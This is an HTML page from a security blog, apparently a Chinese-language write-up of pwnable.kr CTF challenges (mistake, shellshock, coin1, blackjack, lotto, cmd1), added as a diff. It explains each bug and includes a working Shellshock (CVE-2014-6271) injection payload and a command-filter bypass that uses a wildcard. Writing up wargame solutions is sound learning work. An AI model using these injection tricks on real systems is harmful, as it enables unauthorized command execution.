@@ -1,0 +1,279 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>一些pwn题目的解题思路[pwnable.kr] II | WeaponX&#39;s Blog</title>
+  <meta name="author" content="WeaponX">
+  
+  <meta name="description" content="Vulnerability|Security|Binary">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="一些pwn题目的解题思路[pwnable.kr] II"/>
+  <meta property="og:site_name" content="WeaponX&#39;s Blog"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="WeaponX&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+    var hm = document.createElement("script");
+    hm.src = "https://hm.baidu.com/hm.js?ab50f379bb6434641ee0125ce5d37f23";
+    var s = document.getElementsByTagName("script")[0]; 
+    s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  <script>
+  (function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+   })();
+   </script>
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">WeaponX&#39;s Blog</a></h1>
+  <h2><a href="/">Binary</a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-02-14T17:30:58.000Z"><a href="/2017/02/14/一些pwn题目的解题思路-pwnable-kr-II/">2017-02-14</a></time>
+      
+      
+  
+    <h1 class="title">一些pwn题目的解题思路[pwnable.kr] II</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>以下是solution的目录</p>
+<ul>
+<li><a href="#mistake" title="mistake">#mistake</a></li>
+<li><a href="#shellshock" title="shellshock">#shellshock</a></li>
+<li><a href="#coin1" title="coin1">#coin1</a></li>
+<li><a href="#blackjack" title="blackjack">#blackjack</a></li>
+<li><a href="#lotto" title="lotto">#lotto</a></li>
+</ul>
+<p>Other</p>
+<p><a href="http://weaponx.site/2017/02/13/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr/" title="一些pwn题目的解题思路[pwnable.kr]">一些pwn题目的解题思路[pwnable.kr]</a></p>
+<a id="more"></a>
+<h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</div><div class="line">        s[i] ^= XORKEY;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> fd;</div><div class="line">    <span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</div><div class="line">    sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</div><div class="line"></div><div class="line">    <span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</div><div class="line">    <span class="keyword">int</span> len;</div><div class="line">    <span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</div><div class="line">        close(fd);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;       </div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"input password : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</div><div class="line"></div><div class="line">    <span class="comment">// xor your input</span></div><div class="line">    xor(pw_buf2, <span class="number">10</span>);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    close(fd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>题目的hint说符号的优先级：</p>
+<blockquote>
+<p>We all make mistakes, let’s move on.<br>(don’t take this too seriously, no fancy hacking skill is required at all)</p>
+<p>This task is based on real event<br>Thanks to dhmonkey</p>
+<p>hint : operator priority</p>
+</blockquote>
+<p>注意到这里</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>因为<strong>=</strong>的优先级小于<strong>&lt;</strong>，所以<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span></div></pre></td></tr></table></figure></p>
+<p>的执行顺序应该是这样的<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">fd = (open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)</div></pre></td></tr></table></figure></p>
+<p>然而<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line">open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span></div></pre></td></tr></table></figure></p>
+<p>为假，所以<figure class="highlight plain"><figcaption><span>= 0```为标准输入，剩下的流程就很简单了。</span></figcaption><table><tr><td class="code"><pre><div class="line"></div><div class="line">```bash</div><div class="line">mistake@ubuntu:~$ ./mistake </div><div class="line">do not bruteforce...</div><div class="line">0000000000</div><div class="line">input password : 1111111111</div><div class="line">Password OK</div><div class="line">Mommy, the operator priority always confuses me :(</div></pre></td></tr></table></figure></p>
+<h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    setresuid(getegid(), getegid(), getegid());</div><div class="line">    setresgid(getegid(), getegid(), getegid());</div><div class="line">    system(<span class="string">"/home/shellshock/bash -c 'echo shock_me'"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>题目提示破壳漏洞，直接测试一下。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env foo=<span class="string">'() &#123; :;&#125;; echo vul'</span> ./bash -c <span class="string">'echo yes'</span></div><div class="line">vul</div><div class="line">yes</div></pre></td></tr></table></figure>
+<p>存在漏洞，直接丢来exploit</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">shellshock@ubuntu:~$ env foo=<span class="string">'() &#123; :;&#125;; /bin/cat flag'</span> ./shellshock</div><div class="line">only <span class="keyword">if</span> I knew CVE-2014-6271 ten years ago..!!</div><div class="line">Segmentation fault</div></pre></td></tr></table></figure>
+<h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>一个小游戏，查找一堆硬币中假的那个，30s内要完成100次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">---------------------------------------------------</div><div class="line">-              Shall we play a game?              -</div><div class="line">---------------------------------------------------</div><div class="line"></div><div class="line">You have given some gold coins <span class="keyword">in</span> your hand</div><div class="line">however, there is one counterfeit coin among them</div><div class="line">counterfeit coin looks exactly same as real coin</div><div class="line">however, its weight is different from real one</div><div class="line">real coin weighs 10, counterfeit coin weighes 9</div><div class="line"><span class="built_in">help</span> me to find the counterfeit coin with a scale</div><div class="line"><span class="keyword">if</span> you find 100 counterfeit coins, you will get reward :)</div><div class="line">FYI, you have 30 seconds.</div><div class="line"></div><div class="line">- How to play - </div><div class="line">1. you get a number of coins (N) and number of chances (C)</div><div class="line">2. <span class="keyword">then</span> you specify a <span class="built_in">set</span> of index numbers of coins to be weighed</div><div class="line">3. you get the weight information</div><div class="line">4. 2~3 repeats C time, <span class="keyword">then</span> you give the answer</div><div class="line"></div><div class="line">- Example -</div><div class="line">[Server] N=4 C=2    <span class="comment"># find counterfeit among 4 coins with 2 trial</span></div><div class="line">[Client] 0 1        <span class="comment"># weigh first and second coin</span></div><div class="line">[Server] 20         <span class="comment"># scale result : 20</span></div><div class="line">[Client] 3          <span class="comment"># weigh fourth coin</span></div><div class="line">[Server] 10         <span class="comment"># scale result : 10</span></div><div class="line">[Client] 2          <span class="comment"># counterfeit coin is third!</span></div><div class="line">[Server] Correct!</div><div class="line"></div><div class="line">- Ready? starting <span class="keyword">in</span> 3 sec... -</div></pre></td></tr></table></figure></p>
+<p>其实就是一个二分查找，然而因为网络原因跑30次就超时了，于是丢到对方服务器上跑。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re, sys</div><div class="line"></div><div class="line">io = remote(<span class="string">"127.0.0.1"</span>, <span class="number">9007</span>)</div><div class="line">io.recv()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_coin_chance</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        ret = io.recv()</div><div class="line">        pattern = re.compile(<span class="string">"N=(\d+)\sC=(\d+)"</span>)</div><div class="line">        res = pattern.search(ret).groups()</div><div class="line">        log.success(<span class="string">"N=[%d], C=[%d]"</span> % (int(res[<span class="number">0</span>]), int(res[<span class="number">1</span>])))</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        log.success(<span class="string">"Flag =&gt; [%s]"</span> % ret)</div><div class="line">    <span class="keyword">return</span> int(res[<span class="number">0</span>]), int(res[<span class="number">1</span>])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">have_fake</span><span class="params">(nums)</span>:</span></div><div class="line">    ret = int(io.recv())</div><div class="line">    log.success(<span class="string">"Num =&gt; [%d] Weight =&gt; [%d]"</span> % (nums, ret))</div><div class="line">    <span class="keyword">if</span> ret % <span class="number">10</span> == <span class="number">0</span> <span class="keyword">and</span> ret/<span class="number">10</span> == nums:</div><div class="line">        log.info(<span class="string">"No Error find next"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        log.warning(<span class="string">"Find Error"</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_coin</span><span class="params">(base, top)</span>:</span></div><div class="line">    c = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(base, top+<span class="number">1</span>):</div><div class="line">        c += (str(x - <span class="number">1</span>) + <span class="string">" "</span>)</div><div class="line">    log.info(<span class="string">"Send Coins =&gt; [%s]"</span> % c.strip())</div><div class="line">    io.sendline(c.strip())</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(low, high, chance)</span>:</span></div><div class="line"></div><div class="line">    mid = (high + low) / <span class="number">2</span></div><div class="line">    nums = mid - low + <span class="number">1</span></div><div class="line">    send_coin(low, mid)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> chance == <span class="number">0</span>:</div><div class="line">        <span class="keyword">print</span> io.recv()</div><div class="line">        <span class="keyword">return</span></div><div class="line">        <span class="comment">#coins, chance = get_coin_chance()</span></div><div class="line">        <span class="comment">#check(1, coins, chance)</span></div><div class="line"></div><div class="line"></div><div class="line">    log.warning(<span class="string">"low=&gt;[%d] mid=&gt;[%d] high=&gt;[%d]"</span>%(low,mid,high))</div><div class="line">    <span class="keyword">if</span> have_fake(nums):</div><div class="line">        check(low, mid, chance<span class="number">-1</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        check(mid+<span class="number">1</span>, high, chance<span class="number">-1</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        coins, chance = get_coin_chance()</div><div class="line">        check(<span class="number">1</span>, coins, chance)</div></pre></td></tr></table></figure>
+<p>跑出来的结果如下。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[+] Num =&gt; [1] Weight =&gt; [9]</div><div class="line">[!] Find Error</div><div class="line">[*] Send Coins =&gt; [402]</div><div class="line">Correct! (99)</div><div class="line"></div><div class="line">[+] Flag =&gt; [Congrats! get your flag</div><div class="line">    b1NaRy_S34rch1nG_1s_3asy_p3asy</div><div class="line">    ]</div></pre></td></tr></table></figure>
+<h2 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h2><p>这个游戏是个21点的游戏，初始给你$500，赢到$1000000就给出flag。但是，这种想直接玩下去估计得明年了。</p>
+<p>不过题目中给了源代码的连接，<a href="http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html" target="_blank" rel="external">http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html</a></p>
+<p>只能从源代码中找漏洞。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></div><div class="line">&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</div><div class="line"> <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</div><div class="line"></div><div class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></div><div class="line"> &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\nYou cannot bet more money than you have."</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;bet);</div><div class="line">        <span class="keyword">return</span> bet;</div><div class="line"> &#125;</div><div class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</div><div class="line">&#125; <span class="comment">// End Function</span></div></pre></td></tr></table></figure>
+<p>看了下注的代码后，发现一个漏洞，可以下任意大小的筹码（不要溢出了= =）。然后只要赢一次就好了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">YaY_I_AM_A_MILLIONARE_LOL</div><div class="line"></div><div class="line"></div><div class="line">Cash: <span class="variable">$100000500</span></div><div class="line">-------</div><div class="line">|D    |</div><div class="line">|  1  |</div><div class="line">|    D|</div><div class="line">-------</div><div class="line"></div><div class="line">Your Total is 1</div><div class="line"></div><div class="line">The Dealer Has a Total of 10</div><div class="line"></div><div class="line">Enter Bet: $</div></pre></td></tr></table></figure>
+<h2 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</div><div class="line">    </div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</div><div class="line">    fflush(<span class="built_in">stdout</span>);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> r;</div><div class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</div><div class="line">    <span class="comment">//sleep(1);</span></div><div class="line"></div><div class="line">    <span class="comment">// generate lotto numbers</span></div><div class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</div><div class="line">    <span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</div><div class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;     <span class="comment">// 1 ~ 45</span></div><div class="line">    &#125;</div><div class="line">    close(fd);</div><div class="line">    </div><div class="line">    <span class="comment">// calculate lotto score</span></div><div class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</div><div class="line">            <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</div><div class="line">                match++;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// win!</span></div><div class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">// menu</span></div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</div><div class="line"></div><div class="line">        <span class="keyword">switch</span>(menu)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                play();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                help();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>只需要让<strong>match == 6</strong>即可</p>
+<p>这一句是将ascii转换到ascii 1-45之间<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">    lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;        <span class="comment">// 1 ~ 45</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这块正是漏洞所在，<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</div><div class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</div><div class="line">        <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</div><div class="line">            match++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>无法控制lotto的值，可以控制submit的值，但是submit可以相同。所以就暴力破解。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Submit your 6 lotto bytes : !!!!!!</div><div class="line">Lotto Start!</div><div class="line">sorry mom... I FORGOT to check duplicate numbers... :(</div><div class="line">- Select Menu -</div><div class="line">1. Play Lotto</div><div class="line">2. Help</div><div class="line">3. Exit</div></pre></td></tr></table></figure>
+<h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</div><div class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</div><div class="line">    <span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</div><div class="line">    putenv(<span class="string">"PATH=/fuckyouverymuch"</span>);</div><div class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    system( argv[<span class="number">1</span>] );</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>可以看出，system的参数过滤了<em>flag</em>,<em>sh</em>,<em>tmp</em>。不过linux可以使用通配符<em>flag</em>换成<em>f*</em>即可。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">cmd1@ubuntu:~$ ./cmd1 <span class="string">"/bin/cat f*"</span></div><div class="line">mommy now I get what PATH environment is <span class="keyword">for</span> :)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer>
+      
+        
+          <p style="border-top: #e0e0e0 1px dashed; border-right: #e0e0e0 1px dashed; border-bottom: #e0e0e0 1px dashed; border-left: #e0e0e0 1px dashed; padding-top: 10px;padding-right: 10px;padding-bottom: 10px;padding-left: 110px; background: url(http://i.creativecommons.org/l/by-nc-sa/2.5/cn/88x31.png) #e5f1f4 no-repeat 1% 50%; font-family: 微软雅黑; font-size:11px;" id="PSignature">  
+作者：<a href="http://weaponx.site">WeaponX</a>
+<br>出处：<a href="http://weaponx.site/2017/02/14/一些pwn题目的解题思路-pwnable-kr-II/">http://weaponx.site/2017/02/14/一些pwn题目的解题思路-pwnable-kr-II/</a>           
+<br>本文采用<a href="http://creativecommons.org/licenses/by-nc-sa/2.5/cn/" rel="license">知识共享署名-非商业性使用-相同方式共享 2.5 中国大陆许可协议</a>进行许可，欢迎转载，但未经作者同意必须保留此段声明，且在文章页面明显位置给出原文连接。
+</p>
+
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/tech/">技术</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/安全/">安全</a>, <a href="/tags/pwn/">pwn</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+<section id="comment">
+  <h1 class="title">留言</h1>
+
+  
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  
+</section>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:weaponx.site">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/tech/">技术</a><small>9</small></li>
+  
+    <li><a href="/categories/life/">生活</a><small>2</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">标签</h3>
+  <ul class="entry">
+  
+    <li><a href="/tags/Django/">Django</a><small>1</small></li>
+  
+    <li><a href="/tags/Hexo/">Hexo</a><small>4</small></li>
+  
+    <li><a href="/tags/pwn/">pwn</a><small>2</small></li>
+  
+    <li><a href="/tags/博客/">博客</a><small>3</small></li>
+  
+    <li><a href="/tags/安全/">安全</a><small>5</small></li>
+  
+    <li><a href="/tags/影评/">影评</a><small>1</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">友情链接</h3>
+  <ul class="entry">
+  
